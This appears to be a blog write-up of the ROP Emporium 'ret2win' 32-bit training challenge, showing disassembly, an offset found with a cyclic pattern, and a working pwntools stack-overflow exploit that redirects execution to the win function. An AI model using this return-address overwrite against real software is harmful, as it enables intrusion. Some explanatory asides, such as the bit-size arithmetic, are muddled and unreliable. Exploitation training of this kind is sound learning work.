---
title: "ROPEmporium: ret2win 32-bit"
date: 2021-05-24T14:20:00+02:00
---

# Writeup of return to win [Ret2win] on ROPEmporium

Prerequisites: Basic knowledge of assembly and disassembling tools

[Note: Main difference between 32-bit and 64-bit is that the arguments are passed on the stack instead of in registers, and that the sizes of 32-bit and 64-bit addresses are in said order, 4 bytes and 8 bytes of size, reason for the sizes being that is that each byte consists of two nibbles each of which has 4 bits. ((4*2)*8)=64-bit]

----------------------------------------------

Let's start by disassembling the binary with radare2's visual mode. I started by passing aaa to radare2, to analyze the binary and then went into visual mode.
If you're unsure about how this works, look up a radare2 tutorial on YouTube.

```c
>* 0x08048430   50 entry0                                   
   0x08048463    4 fcn.08048463                             
   0x080483f0    6 sym.imp.__libc_start_main            
   0x08048490   41 sym.deregister_tm_clones                
   0x080484d0   54 sym.register_tm_clones                 
   0x08048510   31 entry.fini0                                 
   0x08048540    6 entry.init0                        
   0x080485ad  127 sym.pwnme                              
   0x08048410    6 sym.imp.memset                          
   0x080483d0    6 sym.imp.puts                             
   0x080483c0    6 sym.imp.printf                       
   0x080483b0    6 sym.imp.read                          
   0x0804862c   41 sym.ret2win                           
   0x080483e0    6 sym.imp.system                   
   0x080486c0    2 sym.__libc_csu_fini                   
   0x08048480    4 sym.__x86.get_pc_thunk.bx                
   0x080486c4   20 sym._fini                           
   0x08048660   93 sym.__libc_csu_init                     
   0x08048470    2 sym._dl_relocate_static_pie
   0x08048546  103 main                                     
   0x08048400    6 sym.imp.setvbuf
   0x08048374   35 sym._init 
```

This is the information I got. I see a sym.ret2win, let's look at that!

```c
┌──────────────────────────────────────────┐                                                     
│ [0x804862c]                              │                                                     
│ 41: sym.ret2win ();                      │                                                     
│ push ebp                                 │                                                     
│ mov ebp, esp                             │                                                     
│ sub esp, 8                               │                                                     
│ sub esp, 0xc                             │                                                     
│ ; const char *s                          │                                                     
│ ; 0x80487f6                              │                                                 
│ ; "Well done! Here's your flag:"         │                                                     
│ push str.Well_done__Here_s_your_flag:    │                                                      
│ ; int puts(const char *s)                │                                                     
│ call sym.imp.puts;[oa]                   │  #Calls puts, which will place the string                                                   
│ add esp, 0x10                            │                                                     
│ sub esp, 0xc                             │                                                     
│ ; const char *string                     │                                                     
│ ; 0x8048813                              │                                                     
│ ; "/bin/cat flag.txt"                    │                                                    
│ push str.bin_cat_flag.txt                │  #Pushes the string: "/bin/cat flag.txt" - Try running this in your terminal                                                 
│ ; int system(const char *string)         │                                                     
│ call sym.imp.system;[ob]                 │  #Syscall system, using the top of the stack as an argument (Here the latest pushed item & top of stack is the string)                                                   
│ add esp, 0x10                            │                                                     
│ nop                                      │                                                     
│ leave                                    │                                                     
| ret                                      │                                                     
└──────────────────────────────────────────┘  
```

So somehow if we can return to this function, we'll get the flag. Great!
Let's look at another function, sym.pwnme (?) That sounds interesting. Let's use gdb(pwndbg) instead this time around. With "info functions", or "inf fu" we can see functions and their addresses. 
```c
pwndbg> inf fu
All defined functions:
Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
```
So lets disassemble pwnme

```c
pwndbg> disass pwnme 
Dump of assembler code for function pwnme:
   0x080485ad <+0>: push   ebp
   0x080485ae <+1>: mov    ebp,esp
   0x080485b0 <+3>: sub    esp,0x28
   0x080485b3 <+6>: sub    esp,0x4
   0x080485b6 <+9>: push   0x20
   0x080485b8 <+11>:    push   0x0
   0x080485ba <+13>:    lea    eax,[ebp-0x28]
   0x080485bd <+16>:    push   eax
   0x080485be <+17>:    call   0x8048410 <memset@plt>
   0x080485c3 <+22>:    add    esp,0x10
   0x080485c6 <+25>:    sub    esp,0xc
   0x080485c9 <+28>:    push   0x8048708
   0x080485ce <+33>:    call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:    add    esp,0x10
   0x080485d6 <+41>:    sub    esp,0xc
   0x080485d9 <+44>:    push   0x8048768
   0x080485de <+49>:    call   0x80483d0 <puts@plt>
   0x080485e3 <+54>:    add    esp,0x10
   0x080485e6 <+57>:    sub    esp,0xc
   0x080485e9 <+60>:    push   0x8048788
   0x080485ee <+65>:    call   0x80483d0 <puts@plt>
   0x080485f3 <+70>:    add    esp,0x10
   0x080485f6 <+73>:    sub    esp,0xc
   0x080485f9 <+76>:    push   0x80487e8
   0x080485fe <+81>:    call   0x80483c0 <printf@plt>
   0x08048603 <+86>:    add    esp,0x10
   0x08048606 <+89>:    sub    esp,0x4
   0x08048609 <+92>:    push   0x38   <----------------#size_t nbyte
   0x0804860b <+94>:    lea    eax,[ebp-0x28]
   0x0804860e <+97>:    push   eax    <----------------#void buf
   0x0804860f <+98>:    push   0x0    <----------------#fd
   0x08048611 <+100>:   call   0x80483b0 <read@plt>
   0x08048616 <+105>:   add    esp,0x10
   0x08048619 <+108>:   sub    esp,0xc
   0x0804861c <+111>:   push   0x80487eb
   0x08048621 <+116>:   call   0x80483d0 <puts@plt>
   0x08048626 <+121>:   add    esp,0x10
   0x08048629 <+124>:   nop
   0x0804862a <+125>:   leave  
   0x0804862b <+126>:   ret  
```
Alot of stuff happens here, and it'll be somewhat hard for any beginner to know exactly what's happening here. But we can see that at <+100>, read@plt is called. If we look at the linux manpage for this systemcall we'll learn that: "read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf." Well.. What does that mean? First we need to understand that syscalls takes arguments. 
```C
ssize_t read(int fd, void *buf, size_t count);
```
It takes a filedescriptor, a buf, annd a size_t. 

What's a file descriptor? Well according to @Beano on stackoverflow it can be classified as:
"An opaque handle that is used in the interface between user and kernel space to identify file/socket resources. Therefore, when you use open() or socket() (system calls to interface to the kernel), you are given a file descriptor, which is an integer (it is actually an index into the processes u structure - but that is not important). Therefore, if you want to interface directly with the kernel, using system calls to read(), write(), close() etc. the handle you use is a file descriptor." 

TLDR; It's a handle used between user and the kernel.

Important file descriptor values are:
```
Value---Name---Filestream    

0---Standard input---stdin

1---Standard output---stdout

2---Standard error---stderr
```

If you look above at the disassembling of pwnme, you can see that right before the read@plt call, 0x0 is pushed onto the stack. Which is standard input. This is when the user is prompted for input. Interesting, right?

Let's pick up the pace a little bit. Otherwise I'm going to be here all night.

If we run the program and put in a shit ton of A's, we'll get the bread and butter of stack overflows. Segmentation fault! This tells the exploiter, that somehow he might've overwritten an address in the program, causing an error.
```
Segmentation fault (core dumped)
```
In gdb(pwndbg) you can run a program and make it stop at certain addresses. This is done by break \*addr. You can then step one instruction at a time with si or use ni, which just checks the function you're in. More on that later. Lets open the program with gdb and set a breakpoint right before the read(), this is in my program at pwn+98, it might be different for you. We then run and use ni twice. Now we're prompted for an input. Let's just put in a shit ton of A's. 

(A shit ton is more than 100, just like hold it A down while you glance out the windows, idfk)
I get a "Undefined command".. hmm weird.. But if I look at the registers and stack I see this:

```c
Stack
00:0000│ esp  0xffffd100 ◂— 0x0
01:0004│      0xffffd104 —▸ 0xffffd110 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
02:0008│      0xffffd108 ◂— 0x38 /* '8' */
03:000c│      0xffffd10c ◂— 0x4
04:0010│ ecx  0xffffd110 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```
And registers:
```c
*EAX  0x38
 EBX  0x0
*ECX  0xffffd110 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*EDX  0x38
 EDI  0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0xffffd138 ◂— 'AAAAAAAAAAAAAAAA'
 ESP  0xffffd100 ◂— 0x0
*EIP  0x8048616 (pwnme+105) ◂— add    esp, 0x10
```
We have control of the ecx register and ebp register as we can see we overflowed those with A's. 
In gdb we can use the command to look at the stack:

```diff
-pwndbg> x/100x $sp
0xffffd100: 0x00000000  0xffffd110  0x00000038  0x00000004
0xffffd110: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd120: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd130: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd140: 0x41414141  0x41414141  0x00000000  0xf7de5ee5
0xffffd150: 0xf7fb2000  0xf7fb2000  0x00000000  0xf7de5ee5
0xffffd160: 0x00000001  0xffffd1f4  0xffffd1fc  0xffffd184
0xffffd170: 0xf7fb2000  0x00000000
```
The hex character for capital a (A) is 41. We can see the stack is filled with A's

If we run again, we'll get an interesting error: "Invalid address at 0x41414141" error. Huh?? Seems like it tries to go to an address called 0x41414141??
Cool if we just controlled the address the program tries to go to, we can make it go to "ret2win" and we would've pwned the program. Now we'll be using a pattern generator from pwntools, to find out where this return address is at.

```python
Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>>
>>> pattern = cyclic_gen()
>>> pattern.get(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

If we copy the pattern, we'll be able to see where exactly the return addr is at.
We follow the same process from before, and ni each step through starting from pwn+98. At return we'll see: 
<0x6161616c>
The 616161 is a, and the 6c is an l.

Great so that means we add 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa, characters and can put in our address to return to. A few things to note about the address is, that:

1. The address will need to be passed in little-endian formatting
2. The address can be any address you see in gdb, that is in the .text segment, as these addresses are static

The smart thing about Return-Oriented-Programming, is exactly that one doesn't have to worry about security measures
such as ASLR, because you return to already written code that has a static address. 


**Conclusion: You should now have a lot of knowledge important for the further challenges. We used a "shit ton" of useless characters to overwrite the stack till our return address, at our return address we put an adress we want to return to. We convert the address, since the program is using little endian.**


Exploit:

```python
from pwn import *

elfPath="./ret2win32" #Path to binary
context.arch="i386"

gdbscript= """
continue
"""

terminalSetting = ['gnome-terminal', '-e'] #Ubuntu terminal=gnome-terminal
context.clear(terminal=terminalSetting)

io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript)

point=cyclic_find(b"laaa", endian="little")

ret2win=p32(0x804862c)

def main():
    print(io.recvuntil("> "))
    print(io.send(b"A"*point+ret2win)) #Sends 44 A's, and then the address to the ret2win function
    io.interactive() #Interactive state

main()
```
